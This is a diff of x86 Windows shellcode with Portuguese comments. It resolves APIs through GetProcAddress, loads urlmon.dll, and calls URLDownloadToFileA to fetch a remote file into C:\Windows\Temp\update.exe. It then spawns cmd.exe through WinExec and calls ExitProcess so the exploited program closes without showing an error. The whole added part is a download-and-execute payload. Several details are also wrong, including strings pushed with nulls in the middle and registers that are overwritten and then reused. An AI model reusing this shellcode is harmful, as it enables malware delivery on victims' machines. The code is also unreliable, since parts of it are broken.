@@ -55,3 +55,93 @@ jmp     .proxima_funcao
 .busca_concluida:
 ; Daqui para frente, ESI guarda a GetProcAddress. 
 ; Você pode executar os passos 3, 4 e o script Python que estruturamos antes.
+
+
+; --- BUSCANDO O ENDEREÇO DA LOADLIBRARYA ---
+xor eax, eax
+push eax              ; Fim da string (null terminator)
+push 0x41797261       ; "aryA"
+push 0x62694c64       ; "dLib"
+push 0x616f4c         ; "Loa"
+mov ecx, esp          ; ECX aponta para "LoadLibraryA"
+
+push ecx              ; lpProcName
+push edx              ; hModule (kernel32.dll)
+call esi              ; GetProcAddress(kernel32, "LoadLibraryA")
+mov ebp, eax          ; Guarda o endereço de LoadLibraryA em EBP
+
+
+; --- CARREGANDO A URLMON.DLL ---
+xor eax, eax
+push eax              ; Fim da string
+push 0x6c6c642e       ; ".dll"
+push 0x6e6f6d6c       ; "lmon"
+push 0x7275           ; "ur"
+mov ecx, esp          ; ECX aponta para "urlmon.dll"
+
+push ecx              ; lpLibFileName
+call ebp              ; LoadLibraryA("urlmon.dll")
+mov edx, eax          ; EDX agora guarda o endereço base da urlmon.dll na memória!
+
+; --- BUSCANDO URLDOWNLOADTOFILEA ---
+xor eax, eax
+push eax              ; Fim da string
+push 0x41656c69       ; "ileA"
+push 0x466f5464       ; "dToF"
+push 0x616f6c6e       ; "nloa"
+push 0x776f444c       ; "LDow"
+push 0x5255           ; "UR"
+mov ecx, esp          ; ECX aponta para "URLDownloadToFileA"
+
+push ecx              ; lpProcName
+push edx              ; hModule (urlmon.dll)
+call esi              ; GetProcAddress(urlmon, "URLDownloadToFileA")
+mov ebx, eax          ; EBX agora guarda o endereço da função URLDownloadToFileA!
+
+
+; [!] Suponha que você já empilhou os textos correspondentes na memória e tem:
+; ECX = Ponteiro para o link do arquivo (ex: "http://192.168.1")
+; EDI = Ponteiro para onde salvar localmente (ex: "C:\Windows\Temp\update.exe")
+
+xor eax, eax
+push eax              ; Argumento 5: lpfnCB = NULL (0)
+push eax              ; Argumento 4: dwReserved = 0
+push edi              ; Argumento 3: szFileName (Onde salvar)
+push ecx              ; Argumento 2: szURL (Link do download)
+push eax              ; Argumento 1: pCaller = NULL (0)
+call ebx              ; Executa URLDownloadToFileA!
+
+
+; --- PREPARANDO A STRING "ExitProcess" ---
+xor eax, eax          ; Limpa EAX
+push eax              ; Empilha o zero para garantir o fim da string
+push 0x73736563       ; Empilha "cess"
+push 0x6f725074       ; Empilha "tPro"
+push 0x697845         ; Empilha "Exi" (o zero à esquerda limpa o restante)
+mov ecx, esp          ; ECX agora guarda o endereço do texto "ExitProcess"
+
+; --- PREPARANDO OS ARGUMENTOS ---
+push ecx              ; Argumento 2: Ponteiro para a string "ExitProcess"
+push edx              ; Argumento 1: Endereço Base da kernel32.dll
+
+call esi              ; Chama GetProcAddress novamente!
+                      ; O resultado vai para o EAX.
+                      ; Agora, EAX guarda o endereço dinâmico real da função ExitProcess!
+
+mov ebx, eax          ; Salva o endereço da ExitProcess em EBX para usar depois.
+
+;EXECUTA O COMANDO (Ex: "cmd.exe")
+xor eax, eax
+push eax
+push 0x6578652e       ; ".exe"
+push 0x646d63         ; "cmd"
+mov ecx, esp          ; ECX aponta para "cmd.exe"
+
+push 1                ; Segundo argumento do WinExec: uCmdShow (1 = SW_SHOWNORMAL, mostra a tela)
+push ecx              ; Primeiro argumento do WinExec: lpCmdLine (ponteiro para "cmd.exe")
+call edi              ; EXECUTA WinExec("cmd.exe", 1)
+
+; FECHA O PROGRAMA ALVO DE FORMA LIMPA (Evita que ele trave e exiba erro na tela)
+xor eax, eax
+push eax              ; Argumento do ExitProcess: uExitCode (0 = Fechamento sem erros)
+call ebx              ; EXECUTA ExitProcess(0)
